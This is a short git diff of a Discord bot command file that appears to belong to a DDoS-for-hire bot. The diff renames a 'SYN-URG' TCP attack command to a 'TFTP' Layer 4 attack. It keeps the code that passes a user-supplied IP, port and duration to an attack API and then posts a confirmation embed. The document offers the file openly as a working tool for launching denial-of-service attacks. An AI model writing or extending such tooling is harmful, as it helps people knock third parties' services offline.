@@ -1,10 +1,10 @@
 const { MessageEmbed } = require('discord.js');
-const Util = require("../../Util/index")
+const Util = require('../../Util/index');
 const util = new Util.default;
 module.exports = {
-  name: 'syn-urg',
-  category: '🔥 | TCP Methods',
-  description: 'start an SYN-URG attack',
+  name: 'tftp',
+  category: '⚡ | Layer 4 Basic',
+  description: 'start an TFTP attack',
 
   /**
    * @param {Client} client
@@ -89,7 +89,7 @@ module.exports = {
         await message.delete()
 
         /* sends the attack with embed */
-        await util.requestAPI(address, port, time, 'SYN-URG');
+        await util.requestAPI(address, port, time, "TFTP");
         return message.channel.send(new MessageEmbed()
           .setThumbnail(client.user.displayAvatarURL())
           .setColor(0xff1100)
@@ -97,7 +97,7 @@ module.exports = {
             `> ❯ IP: **${address}**`,
             `> ❯ Port: **${port}**`,
             `> ❯ Time: **${time}**`,
-            `> ❯ Method: **SYN-URG**`
+            `> ❯ Method: **TFTP**`
           ])
           .setFooter(message.author.tag, message.member.user.displayAvatarURL())
           .setTimestamp()
